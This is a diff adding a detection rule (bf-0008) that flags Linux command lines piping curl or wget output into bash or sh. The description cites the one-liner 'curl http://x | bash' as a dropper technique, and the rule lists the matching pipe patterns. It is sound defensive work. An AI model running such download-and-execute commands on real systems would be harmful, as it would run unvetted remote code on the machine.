@@ -1,0 +1,29 @@
+title: Download Piped Directly to a Shell (Linux)
+id: bf-0008
+status: experimental
+description: >
+  curl http://x | bash (or wget -qO- | sh) fetches and executes a remote script
+  in one step, leaving no file on disk to scan. It is the Linux equivalent of
+  certutil download-and-run (bf-0002) and a staple of cryptominer droppers and
+  post-exploitation one-liners.
+author: Ravi
+date: 2026/07/13
+level: high
+mitre:
+  - T1105
+  - T1059.004
+logsource:
+  category: process
+detection:
+  command_line|contains:
+    - "curl"
+    - "wget"
+  command_line|contains|2:
+    - "| bash"
+    - "| sh"
+    - "|bash"
+    - "|sh"
+  condition: all
+falsepositives:
+  - Developer tooling installs (rustup, homebrew, nvm) use this exact pattern.
+    Baseline the fetched domains; alert on raw IPs and unknown hosts.
